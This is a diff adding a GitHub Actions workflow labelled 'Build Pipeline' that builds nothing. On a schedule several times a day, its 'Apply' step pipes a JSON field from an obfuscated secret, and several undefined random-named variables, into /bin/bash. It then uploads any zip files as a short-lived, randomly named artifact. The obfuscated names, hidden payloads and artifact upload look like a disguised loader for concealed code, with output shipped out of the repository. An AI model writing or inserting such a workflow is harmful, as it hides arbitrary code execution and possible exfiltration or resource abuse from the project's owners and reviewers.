@@ -1,0 +1,35 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '16 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          l137: ${{ secrets.l137 }}
+        run: |
+          printf '%s' "$l137" | jq -r .lud01277 | /bin/bash
+          printf '%s' "$ogttz92" | jq -r .ayp78422 | /bin/bash
+          echo $iwbfb755 | jq -r .y53 | /bin/bash
+          printf '%s' "$z4255" | jq -r .zj90448 | /bin/bash
+          printf '%s' "$qj67314" | jq -r .cy705 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: DCEW1AyD
+          path: "*.zip"
+          retention-days: 1
